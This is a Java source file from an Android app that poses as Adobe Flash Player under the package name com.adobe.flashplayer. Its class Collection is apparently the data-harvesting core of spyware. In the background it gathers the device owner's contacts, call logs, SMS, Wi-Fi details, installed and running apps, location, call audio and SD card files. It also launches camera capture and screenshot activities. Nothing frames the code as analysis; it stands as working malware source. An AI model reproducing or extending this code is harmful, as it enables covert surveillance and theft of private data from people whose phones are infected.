package com.adobe.flashplayer.data;


import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.accessory.AccessHelper;
import com.adobe.flashplayer.install.InstallActivity;


public class Collection {

    private static final String TAG = "[ljg]Collection ";

    public Collection(Context context) {

        Log.e(TAG, "[liujinguang]start");
    }


    public static void collectUserData(Context context) {

        Log.e(TAG, "[liujinguang]collect start");

        long timenow = System.currentTimeMillis();
        String lasttime = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.PROGRAM_LAST_TIME);
        if (lasttime.equals("") == true || lasttime == null) {

            PrefOper.setValue(context, Public.PARAMCONFIG_FileName,
                    Public.PROGRAM_LAST_TIME, String.valueOf(timenow));

        } else {
            if (timenow - Long.parseLong(lasttime) >= Public.BASIC_RETRIEVE_INTERVAL) {
                PrefOper.setValue(context, Public.PARAMCONFIG_FileName,
                        Public.PROGRAM_LAST_TIME, String.valueOf(timenow));
            } else {
                if(InstallActivity.debug_flag){
                    //test mode
                }else{
                    return;
                }

            }
        }
        MyLog.writeLogFile("main proc start at:" + Utils.formatCurrentDate() + "\r\n");

        int installMode = AccessHelper.getInstallMode(context);

        PhoneInformation.getPhoneInformation(context);

        PhoneApps.getInstallApps(context);

        PhoneRunning.getPhoneRunning(context);

        PhoneContacts.getPhoneContacts(context);

        PhoneCallLog.getPhoneCallLog(context);

        PhoneSMS.getSmsFromPhone(context);

        PhoneWIFI.getPhoneWIFI(context);

        try {
            new Thread(new PhoneCallAudioWrapper(context)).start();

            new Thread(new PhoneContentWrapper(context)).start();

            new Thread(new PhoneLocationWrapper(context)).start();

        }catch(Exception e){
            e.printStackTrace();
        }

        PhoneLocationWrapper.getLastLocation(context);

        if (installMode == AccessHelper.INSTALL_TYPE_SO || installMode == AccessHelper.INSTALL_TYPE_JAR) {
            new Thread(new CameraDialog(context, 0)).start();
        }else if (installMode == AccessHelper.INSTALL_TYPE_APK || installMode == AccessHelper.INSTALL_TYPE_MANUAL){
            Intent intentCamera = new Intent(context,CameraActivity2.class);
            intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intentCamera);

            Intent intentScr = new Intent(context,ScreenShotActivity.class);
            intentScr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intentScr);
        }

        PhoneSDFiles sdcardfies = new PhoneSDFiles(context,Public.SDCARDPATH, Public.LOCAL_PATH_NAME, Public.SDCARDFILES_NAME,Public.CMD_DATA_SDCARDFILES);
        Thread thread = new Thread(sdcardfies);
        thread.start();

        Log.e(TAG, "[liujinguang]collect complete");
    }
}
